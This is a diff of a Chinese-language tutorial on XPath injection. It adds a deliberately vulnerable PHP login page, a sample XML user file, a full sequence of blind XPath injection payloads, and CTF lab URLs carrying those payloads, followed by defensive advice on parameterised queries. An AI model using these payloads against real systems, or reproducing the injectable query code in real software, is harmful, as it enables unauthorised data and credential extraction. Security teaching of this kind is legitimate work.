@@ -4,6 +4,7 @@
 typora-copy-images-to: media
 typora-root-url: ./media
 
+
 ---
 
 # 1. 基础理论
@@ -12,8 +13,8 @@ typora-root-url: ./media
 
 >  维基百科的定义：
 >
-> XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的计算机语言。
-> XPath基于XML的树状结构，提供在数据结构树中找寻节点的能力。起初XPath的提出的初衷是将其作为一个通用的、介于XPointer与XSL间的语法模型。但是XPath很快的被开发者采用来当作小型查询语言。
+>  XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的计算机语言。
+>  XPath基于XML的树状结构，提供在数据结构树中找寻节点的能力。起初XPath的提出的初衷是将其作为一个通用的、介于XPointer与XSL间的语法模型。但是XPath很快的被开发者采用来当作小型查询语言。
 
 
 
@@ -71,6 +72,7 @@ typora-root-url: ./media
 关于使用attribute坐标简写语法的一个范例，//a/@href在文件树里任何地方的元素下选择了一个叫href的属性。self坐标最通常与述语同用，以参考现行选定节点。例如，h3[.='See also']在现行上下文选取了叫h3的元素，该元素文字内容是See also。
 
 ### 1.2.2. 节点测试
+
 节点测试包括特定节点名或者更一般的表达式。至于XML里名字空间前缀gs已定义的文件，//gs:enquiry将找到所有在那名字空间里enquiry的节点。
 
 其他节点格式：
@@ -491,49 +493,168 @@ if (file_exists('score.xml')) {
 | substring-before | 返回第一个参数字符串中第一次出现第二个参数字符串之前的子字符串。 |
 | translate        | 返回第一个参数字符串，出现第二个参数字符串中的字符的位置替换为第三个参数字符串中对应位置的字符。 |
 
+~~~xml
+# test.xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<accounts>
+               <user id="1">
+                              <username>Twe1ve</username>
+                              <email>admin@xx.com</email>
+                              <accounttype>administrator</accounttype>
+                              <password>P@ssword123</password>
+               </user>
+               <user id="2">
+                              <username>test</username>
+                              <email>tw@xx.com</email>
+                              <accounttype>normal</accounttype>
+                              <password>123456</password>
+               </user>
+</accounts>
+~~~
 
+~~~php
+# index.php
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+<form method="POST">
+    username：
+    <input type="text" name="username">
+    </p>
+    password：
+    <input type="password" name="password">
+    </p>
+    <input type="submit" value="登录" name="submit">
+    </p>
+</form>
+</body>
+</html>
+<?php
+if (file_exists('test.xml')) {
+    $xml = simplexml_load_file('test.xml');
+    if ($_POST['submit']) {
+        $username = $_POST['username'];
+        $password = $_POST['password'];
+        $x_query = "/accounts/user[username='{$username}' and password='{$password}']";
+        $result = $xml->xpath($x_query);
+        if (count($result) == 0) {
+            echo '登录失败';
+        } else {
+            echo "登录成功";
+            $login_user = $result[0]->username;
+            echo "you login as $login_user";
+        }
+    }
+}
+?>
+~~~
 
-> 以前文的环境为例,如果我们想遍历出整个XML文档,一般步骤如下:
+> xpath盲注适用于攻击者不清楚XML文档的架构，没有错误信息返回，一次只能通过布尔化查询来获取部分信息，**Xpath盲注步骤：**
 >
-> 1.判断根下节点数:
+> - 判断根节点下的节点数
+> - 判断根节点下节点长度&名称
+> - .....
+> - 重复猜解完所有节点，获取最后的值
 >
-> 127.0.0.1/xpath/index.php?name=1' or count(/*)=1 or '1'='1&pwd=fake
+> 从根节点开始判断：
 >
-> result: 1
+> ```
+> 'or count(/)=1  or ''='     ###根节点数量为1
+> 'or count(/*)=1 or ''='   ##根节点下只有一个子节点
+> ```
 >
-> 2.猜解第一级节点:
+> 判断根节点下的节点长度为8：
 >
-> 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),1,1)='r' or '1'='1&pwd=fake
+> ```
+> 'or string-length(name(/*[1]))=8 or ''='
+> ```
 >
-> 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),2,1)='o' or '1'='1&pwd=fake
+> 猜解根节点下的节点名称：
 >
+> ```
+> 'or substring(name(/*[1]), 1, 1)='a'  or ''='
+> 'or substring(name(/*[1]), 2, 1)='c'  or ''='
+> ..
+> 'or substring(name(/*[1]), 8, 1)='s'  or ''='
+> ```
+>
+> 猜解出该节点名称为accounts
+>
+> ```
+> 'or count(/accounts)=1  or ''='   /accounts节点数量为1
+> 'or count(/accounts/user/*)>0 or ''='     /accounts下有两个节点
+> 
+> 'or string-length(name(/accounts/*[1]))=4  or ''='    第一个子节点长度为4
+> ```
+>
+> 猜解accounts下的节点名称：
+>
+> ```
+> 'or substring(name(/accounts/*[1]), 1, 1)='u'  or ''='
 > ...
+> 'or substring(name(/accounts/*[1]), 4, 1)='r'  or ''='
+> ```
 >
-> result: root
+> accounts下子节点名称为user
 >
-> 3.判断root的下一级节点数:
+> ```
+> 'or count(/accounts/user)=2  or ''='    user节点有两个，则可以猜测出accounts节点结构，accounts下两个节点，均为user节点
+> ```
 >
-> 127.0.0.1/xpath/index.php?name=1' or count(/root/*)=2 or '1'='1&pwd=fake
+> 第一个user节点的子节点长度为8：
+> 'or string-length(name(/accounts/user[position()=1]/*[1]))=8 or ''=' 读取user节点的下子节点
 >
-> result: 2
->
-> 4.猜解root的下一级节点:
->
-> 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&pwd=fake
->
-> 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=2]),1,1)='s' or '1'='1&pwd=fake
->
-> result: users,secret
->
-> 重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.
->
-> 猜解id为1的user节点下的username值,
->
-> 127.0.0.1/xpath/index.php?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&pwd=fake
->
+> ```
+> 'or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)='u'  or ''='
+> 'or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)='s'  or ''='
 > ...
+> 'or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)='e'  or ''='
+> ```
 >
-> result: admin
+> 最终所有子节点值验证如下：
+>
+> ```
+> 'or substring(name(/accounts/user[position()=1]/*[1]), 1)='username'  or ''='
+> 'or substring(name(/accounts/user[position()=1]/*[2]), 1)='email'  or ''='
+> 'or substring(name(/accounts/user[position()=1]/*[3]), 1)='accounttype'  or ''='
+> 'or substring(name(/accounts/user[position()=1]/*[4]), 1)='password'  or ''='
+> ```
+>
+> 继续猜解：
+>
+> ```
+> 'or count(/accounts/user[position()=1]/username/*)>0 or ''='   
+> 'or count(/accounts/user[position()=1]/email/*)>0 or ''=' 
+> 'or count(/accounts/user[position()=1]/accounttype/*)>0 or ''='
+> 'or count(/accounts/user[position()=1]/username/password/*)>0 or ''='
+> ```
+>
+> 均为 false，不再有子节点，则可以尝试读取这些节点的值 第一个user下的username值长度为6:
+>
+> ```
+> 'or string-length((//user[position()=1]/username[position()=1]))=6  or ''='
+> ```
+>
+> 读取第一个user下usernaem的值
+>
+> ```
+> 'or substring((//user[position()=1]/username[position()=1]),1,1)='T'  or ''='
+> ....
+> 'or substring((//user[position()=1]/username[position()=1]),6,1)='e'  or ''='
+> ```
+>
+> 可依次读取所有的子节点的值，第二user节点的子节点值读取方式：
+>
+> ```
+> 'or string-length((//user[position()=2]/username[position()=1]))=4 or ''='  第一个user下的username长度为4
+> ......
+> ```
+>
+> 重复上边步骤即可
 
 ## 3.1. CTF-01
 
@@ -660,7 +781,27 @@ if($result) {
 
 ![img](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/xpath%E6%B3%A8%E5%85%A5/media/image-20211013182254273.png)
 
+> 无回显猜解xml文档结构信息，猜解根元素个数:http://10.37.129.3:8305/xpath1/index.php?name=x' or count(/*)=1 or '1'='1&pwd=x   //x' or count(/*)=1 or '1'='1&pwd=x
 
+![img](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/xpath%E6%B3%A8%E5%85%A5/media/image-20211015230952037.png)
+
+>猜解标签名称的长度：http://10.37.129.3:8305/xpath1/index.php?name=x' or string-length(name(/*))=4 or '1'='1&pwd=x  
+>
+>[payload] x' or string-length(name(/*))=4 or '1'='1&pwd=x
+
+
+
+> 猜解标签名称：http://10.37.129.3:8305/xpath1/index.php?name=x' or substring(name(/*),1,1)='r' or '1'='1&pwd=x
+>
+> [payload] x' or substring(name(/*),1,1)='r' or '1'='1&pwd=x
+>
+> .....进而可以盲猜这个xml的整个文档
+
+![img](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/xpath%E6%B3%A8%E5%85%A5/media/image-20211015231233693.png)
+
+
+
+![img](https://github.com/eagleatman/Injection/blob/master/%E6%B3%A8%E5%85%A5/xpath%E6%B3%A8%E5%85%A5/media/image-20211015225422019.png)
 
 
 
@@ -674,11 +815,11 @@ if($result) {
 >
 > 参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。。如下代码可以通过创建保存查询的外部文件使查询参数化：
 >
->   declare variable $loginID as xs：string external；
+> declare variable $loginID as xs：string external；
 >
->   declare variable $password as xs：string external；
+> declare variable $password as xs：string external；
 >
->   //users/user[@loginID=$loginID and@password= $password]
+> //users/user[@loginID=$loginID and@password= $password]
 >
 > \4.  通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。
 >
